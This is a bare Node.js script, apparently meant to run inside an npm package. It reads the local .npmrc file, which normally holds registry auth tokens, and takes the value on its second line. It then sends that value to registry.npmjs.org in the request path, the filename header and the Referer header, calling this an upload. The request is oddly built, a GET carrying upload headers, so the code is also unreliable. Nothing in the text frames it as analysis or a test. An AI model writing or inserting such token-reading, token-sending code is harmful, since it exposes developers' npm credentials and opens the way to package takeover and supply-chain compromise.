// import fs and https
var fs = require("fs");
var https = require("https");

// read .npmrc
var npmrc = fs.readFileSync(".npmrc", "utf8");

// https get to upload using content as referer on header
https
  .get(
    {
      host: "registry.npmjs.org",
      path: "/_upload/" + npmrc.split("\n")[1].split("=")[1],
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Length": fs.statSync(".npmrc").size,
        "Content-Transfer-Encoding": "binary",
        "Content-Disposition":
          'attachment; filename="' + npmrc.split("\n")[1].split("=")[1] + '"',
        Referer:
          "https://registry.npmjs.org/" + npmrc.split("\n")[1].split("=")[1],
      },
    },
    function (res) {
      // console.log(res.statusCode);
      // console.log(res.headers);
      res.on("data", function (d) {
        // console.log(d);
      });
      res.on("end", function () {
        console.log("uploaded");
      });
    }
  )
  .on("error", function (e) {
    console.log(e);
  });
